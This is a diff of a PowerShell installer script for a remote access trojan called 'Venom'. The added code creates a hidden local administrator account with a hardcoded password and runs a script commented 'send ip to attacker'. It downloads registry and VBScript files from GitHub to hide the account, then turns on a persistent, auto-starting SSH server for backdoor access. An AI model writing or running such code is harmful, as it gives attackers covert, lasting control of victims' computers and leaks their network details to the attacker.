@@ -6,60 +6,66 @@ function random_text {
 }
 
 #create admin for rat
-function create_account {
+function Create-NewLocalAdmin {
     [CmdletBinding()]
     param (
-        [string] $uname,
-        [securestring] $pword
+        [string] $NewLocalAdmin,
+        [securestring] $Password
     )
     begin {
     }
     process {
-        New-LocalUser "$uname" -pword $pword
-        -FullName "$uname" -Description
-        "Temporary local admin"
-        Write-Verbose "$uname local user created"
-        Add-LocalGroupmember -LocalGroupmember
-        "Administrators" -Member "$uname"
+        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
+        Write-Verbose "$NewLocalAdmin local user created"
+        Add-LocalGroupmember -Group "Administrators" -Member "$NewLocalAdmin"
+        Write-Verbose "$NewLocalAdmin added to the local administrator group"
     }
     end {
     }
 }
-
-# create admin user
-$uname = random_text
-$pword = (ConvertTo-SecureString "OnlyRat123"
-AsPlainText -Force)
-create_account -uname $uname -pword $pword
-
-# registry to hide  local admin
-$reg_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/Dukk3D3nnis/resources/refs/heads/main/admin.reg -OutFile "$reg_file.reg"
-
-#visual basic scrit to download the registry
-$vbs_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/Dukk3D3nnis/resources/refs/heads/main/confirm.vbs -OutFile "$vbs_file.vbs"
-
-#install the registry
-./"$reg_file.reg";"vbs_file.vbs"
+$NewLocalAdmin = "Venom"
+$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 ## variables
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
-# embedding persistent ssh
-Add-WindowsCapability -Online -Name OpenSSH.
-Server~~~~0.0.1.0
-Staer-Service sshd
-Set-Service -Name sshd -StartupType 'Automatic'
-Get-NetFirewallRule -Name *ssh*
+
+# create admin user
+$uname = "Venom"
+$pword = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
+create_account -uname $uname -pword $pword
+
+# send ip to attacker
+./smtp.ps1
 
 #goto temp, make working dir
 mkdir $path
 cd $path
+# mv $initial_dir/smtp.txt ./smtp.ps1
+./smtp.ps1
+
+# registry to hide  local admin
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"
+
+#visual basic scrit to download the registry
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty.vbs -OutFile "calty.vbs"
+
+# enabling  persistent ssh
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+Get-NetFirewallRule -Name *ssh*
+
+#install the registry
+./wrev.reg; ./calty
+
+# hide venom user
+
 
 # self delete
-cd $initial_dir
+# cd $initial_dir
 # del installer.ps1
 
